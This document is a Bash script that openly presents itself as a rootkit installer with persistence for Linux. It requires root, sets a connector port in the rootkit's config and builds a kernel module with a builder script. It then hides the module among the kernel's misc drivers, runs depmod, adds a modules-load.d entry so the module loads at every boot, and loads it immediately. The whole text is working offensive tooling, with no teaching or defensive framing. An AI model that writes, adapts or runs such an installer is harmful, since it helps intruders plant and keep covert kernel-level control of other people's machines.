#!/bin/bash

# Rootkit Installer with Persistence (Standard misc/ path)

set -e

# Check for root privileges
if [ "$EUID" -ne 0 ]; then
    echo "[-] Please run as root"
    exit 1
fi

# Prompt for port number
read -p "Enter the connector port number: " PORT_NUMBER
if [ -z "$PORT_NUMBER" ]; then
    echo "[-] Port number is required"
    exit 1
fi

# Validate port number
if ! [[ "$PORT_NUMBER" =~ ^[0-9]+$ ]] || [ "$PORT_NUMBER" -lt 1 ] || [ "$PORT_NUMBER" -gt 65535 ]; then
    echo "[-] Invalid port number. Must be between 1 and 65535"
    exit 1
fi

echo "[+] Using port: $PORT_NUMBER"

# Update config
sed -i.bak "s/port: \"[0-9]*\"/port: \"$PORT_NUMBER\"/" rootkit_files/config.yml

# Build rootkit
echo "[+] Building rootkit..."
python3 builder.py -c rootkit_files/config.yml -o

# Get rootkit name
if [ -z "$1" ]; then
    read -p "Enter rootkit name: " ROOTKIT_NAME
    if [ -z "$ROOTKIT_NAME" ]; then
        echo "[-] Rootkit name is required"
        exit 1
    fi
else
    ROOTKIT_NAME="$1"
fi

KERNEL_VERSION=$(uname -r)
MODULE_PATH="/lib/modules/${KERNEL_VERSION}/kernel/drivers/misc"
MODULE_CONF="/etc/modules-load.d/${ROOTKIT_NAME}.conf"
MODULE_KO="${ROOTKIT_NAME}.ko"

# Verify build output
if [ ! -f "$MODULE_KO" ]; then
    echo "[-] Build failed: ${MODULE_KO} not found"
    exit 1
fi

# Copy to misc/ directory
echo "[+] Installing to: $MODULE_PATH"
mkdir -p "$MODULE_PATH"
cp "$MODULE_KO" "$MODULE_PATH/"
chmod 644 "$MODULE_PATH/$MODULE_KO"

# Update module index
echo "[+] Running depmod..."
depmod -a

# Create auto-load config
echo "[+] Creating auto-load config at $MODULE_CONF"
echo "$ROOTKIT_NAME" > "$MODULE_CONF"

# Load module now
echo "[+] Loading module using modprobe..."
modprobe "$ROOTKIT_NAME"

# Verify success
if lsmod | grep -q "$ROOTKIT_NAME"; then
    echo "[✓] Rootkit '${ROOTKIT_NAME}' successfully installed and will persist on reboot"
else
    echo "[✗] Module did not load. Check 'dmesg' for kernel errors"
    exit 1
fi

echo ""
echo "Installation Summary:"
echo "- Installed module: $MODULE_PATH/$MODULE_KO"
echo "- Auto-load config: $MODULE_CONF"
echo "- Status: $(lsmod | grep "$ROOTKIT_NAME" | awk '{print $1 " (loaded)"}')"
